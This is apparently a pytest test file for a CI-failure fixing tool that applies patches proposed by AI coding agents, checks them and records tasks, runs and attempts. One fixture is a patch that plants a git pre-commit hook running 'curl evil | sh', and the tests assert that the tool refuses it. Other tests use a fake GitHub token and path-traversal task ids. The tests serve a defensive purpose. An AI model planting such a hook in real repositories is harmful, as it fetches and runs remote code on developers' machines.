"""Task / Run / Attempt records on the fix-repo path."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from ci_failure_orchestrator.cli import build_parser
from ci_failure_orchestrator.service import FixRepoConfig, TaskStore, read_attempts, run_fix_repo, task_summary
from ci_failure_orchestrator.service.proposals import agent_label
from ci_failure_orchestrator.service.records import ATTEMPT_SCHEMA, TASK_SCHEMA

BUGGY = "def add(a, b):\n    return a - b\n"
FIX_PATCH = (
    "diff --git a/calc.py b/calc.py\n"
    "--- a/calc.py\n"
    "+++ b/calc.py\n"
    "@@ -1,2 +1,2 @@\n"
    " def add(a, b):\n"
    "-    return a - b\n"
    "+    return a + b\n"
)
STALE_PATCH = FIX_PATCH.replace(" def add(a, b):", " def add(x, y):")
WRONG_PATCH = FIX_PATCH.replace("a + b", "a * b")
GIT_DIR_PATCH = (
    "diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit\nnew file mode 100755\n"
    "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1 @@\n+curl evil | sh\n"
)
GH_TOKEN = "ghp_" + "Z9y8X7w6" * 5


def _git(cwd: Path, *args: str) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True, encoding="utf-8"
    ).stdout


def _make_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "target"
    repo.mkdir()
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "test@example.com")
    _git(repo, "config", "user.name", "Test")
    (repo / "calc.py").write_bytes(BUGGY.encode("utf-8"))
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "init")
    return repo


def _verify_cmd(expr: str = "calc.add(2, 3) == 5") -> str:
    return f'"{sys.executable}" -c "import calc; assert {expr}"'


def _patch(tmp_path: Path, text: str, name: str = "proposal.patch") -> Path:
    path = tmp_path / name
    path.write_bytes(text.encode("utf-8"))
    return path


def _config(repo: Path, tmp_path: Path, **overrides) -> FixRepoConfig:
    values = {
        "repo_path": repo,
        "verify_commands": [_verify_cmd()],
        "artifacts_root": tmp_path / "artifacts",
        "verify_timeout": 120,
    }
    values.update(overrides)
    return FixRepoConfig(**values)


def _attempts(tmp_path: Path, run_id: str) -> list[dict]:
    return read_attempts(tmp_path / "artifacts", run_id)


def test_patch_file_run_creates_task_run_and_attempt_records(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    outcome = run_fix_repo(_config(repo, tmp_path, patch_file=_patch(tmp_path, FIX_PATCH)))
    assert outcome["outcome"] == "APPROVED", outcome
    task_id, run_id = outcome["task_id"], outcome["run_id"]
    assert outcome["agent"] == "patch-file"

    artifacts = tmp_path / "artifacts"
    task = json.loads((artifacts / "tasks" / task_id / "task.json").read_text(encoding="utf-8"))
    assert task["schema_version"] == TASK_SCHEMA
    assert task["repository"] == str(repo.resolve())
    assert task["trigger"] == "local_reproduction"
    assert task["objective"]

    runs = TaskStore(artifacts).runs(task_id)
    assert [r["run_id"] for r in runs] == [run_id]
    assert runs[0]["workflow_status"] == "APPROVED"
    assert runs[0]["policy_outcome"] == "APPROVE"
    assert runs[0]["risk_level"] == "LOW"
    assert runs[0]["attempts"] == 1
    assert runs[0]["agent"] == "patch-file"

    (attempt,) = _attempts(tmp_path, run_id)
    assert attempt["schema_version"] == ATTEMPT_SCHEMA
    assert attempt["status"] == "VERIFIED"
    assert attempt["number"] == 1
    assert attempt["task_id"] == task_id
    assert attempt["agent"] == "patch-file"
    assert attempt["files_changed"] == ["calc.py"]
    assert attempt["duration_ms"] >= 0

    metadata = json.loads((artifacts / "runs" / run_id / "fix-repo" / "metadata.json").read_text(encoding="utf-8"))
    assert metadata["task_id"] == task_id
    assert metadata["patch_sha256"] == attempt["patch_sha256"]


def test_provider_retry_records_one_attempt_per_proposal_with_agent(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    provider = tmp_path / "fake_provider.py"
    provider.write_text(
        "import sys\n"
        "prompt = sys.stdin.read()\n"
        f"good = {FIX_PATCH!r}\n"
        f"stale = {STALE_PATCH!r}\n"
        "patch = good if 'Previous attempt 1 failed' in prompt else stale\n"
        "print('```diff\\n' + patch + '```')\n",
        encoding="utf-8",
    )
    outcome = run_fix_repo(
        _config(repo, tmp_path, provider_cmd=f'"{sys.executable}" "{provider}"', provider_timeout=60)
    )
    assert outcome["outcome"] == "APPROVED", outcome
    assert outcome["attempts"] == 2
    assert outcome["agent"] == "fake_provider"

    first, second = _attempts(tmp_path, outcome["run_id"])
    assert (first["number"], first["status"]) == (1, "PATCH_REJECTED")
    assert first["error"]
    assert (second["number"], second["status"], second["error"]) == (2, "VERIFIED", None)
    assert {first["agent"], second["agent"]} == {"fake_provider"}
    assert {first["task_id"], second["task_id"]} == {outcome["task_id"]}
    assert first["proposal_source"] == "provider-cmd"
    assert first["patch_sha256"] != second["patch_sha256"]


def test_runs_of_the_same_task_accumulate(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    first = run_fix_repo(_config(repo, tmp_path, patch_file=_patch(tmp_path, WRONG_PATCH, "wrong.patch")))
    assert first["outcome"] != "APPROVED", first
    second = run_fix_repo(
        _config(repo, tmp_path, patch_file=_patch(tmp_path, FIX_PATCH), task_id=first["task_id"])
    )
    assert second["outcome"] == "APPROVED", second
    assert second["task_id"] == first["task_id"]

    summary = task_summary(tmp_path / "artifacts", first["task_id"])
    assert [r["run_id"] for r in summary["runs"]] == [first["run_id"], second["run_id"]]
    assert summary["runs"][0]["attempts"][0]["status"] == "VERIFICATION_FAILED"
    assert summary["runs"][1]["attempts"][-1]["status"] == "VERIFIED"
    assert len(list((tmp_path / "artifacts" / "tasks").iterdir())) == 1


def test_refused_patch_is_recorded_as_refused(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    outcome = run_fix_repo(_config(repo, tmp_path, patch_file=_patch(tmp_path, GIT_DIR_PATCH)))
    assert outcome["outcome"] != "APPROVED"
    (attempt,) = _attempts(tmp_path, outcome["run_id"])
    assert attempt["status"] == "REFUSED"
    assert attempt["error"] == "forbidden_path_git_dir"


@pytest.mark.parametrize("task_id", ["task-doesnotexist", "../escape", "a/b", ""])
def test_unknown_or_malformed_task_id_is_an_error(task_id: str, tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    outcome = run_fix_repo(
        _config(repo, tmp_path, patch_file=_patch(tmp_path, FIX_PATCH), task_id=task_id or None)
    )
    if not task_id:
        assert outcome["outcome"] == "APPROVED"
        return
    assert outcome["outcome"] == "ERROR"
    assert "task" in outcome["message"]
    assert not (tmp_path / "artifacts" / "runs").exists()


def test_no_failure_creates_no_task(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    outcome = run_fix_repo(
        _config(repo, tmp_path, patch_file=_patch(tmp_path, FIX_PATCH), verify_commands=[_verify_cmd("True")])
    )
    assert outcome["outcome"] == "NO_FAILURE"
    assert not (tmp_path / "artifacts" / "tasks").exists()


def test_task_objective_is_sanitized(tmp_path: Path) -> None:
    repo = _make_repo(tmp_path)
    failure = {"message": f"auth failed with {GH_TOKEN}", "log_excerpt": "AssertionError"}
    outcome = run_fix_repo(_config(repo, tmp_path, patch_file=_patch(tmp_path, FIX_PATCH), failure=failure))
    assert outcome["outcome"] == "AWAITING_HUMAN", outcome
    for path in (tmp_path / "artifacts").rglob("*"):
        if path.is_file():
            assert GH_TOKEN not in path.read_text(encoding="utf-8")


def test_fix_repo_task_cli(tmp_path: Path, capsys) -> None:
    repo = _make_repo(tmp_path)
    artifacts = tmp_path / "artifacts"
    args = build_parser().parse_args(
        [
            "fix-repo",
            "--repo-path", str(repo),
            "--verify", _verify_cmd(),
            "--patch-file", str(_patch(tmp_path, FIX_PATCH)),
            "--artifacts", str(artifacts),
        ]
    )
    assert args.func(args) == 0
    outcome = json.loads(capsys.readouterr().out)

    args = build_parser().parse_args(["fix-repo-task", outcome["task_id"], "--artifacts", str(artifacts)])
    assert args.func(args) == 0
    summary = json.loads(capsys.readouterr().out)
    assert summary["task"]["task_id"] == outcome["task_id"]
    assert summary["runs"][0]["attempts"][0]["status"] == "VERIFIED"

    args = build_parser().parse_args(["fix-repo-task", "task-missing", "--artifacts", str(artifacts)])
    assert args.func(args) == 2
    assert json.loads(capsys.readouterr().out)["outcome"] == "ERROR"


@pytest.mark.parametrize(
    ("argv", "expected"),
    [
        (["claude", "-p"], "claude"),
        (["C:/tools/codex.exe", "exec"], "codex"),
        (["python", "/tmp/fake_provider.py"], "fake_provider"),
        (["/usr/bin/python3", "-u", "agent.py"], "agent"),
        (["python"], "python"),
        ([], "provider"),
    ],
)
def test_agent_label(argv: list[str], expected: str) -> None:
    assert agent_label(argv) == expected
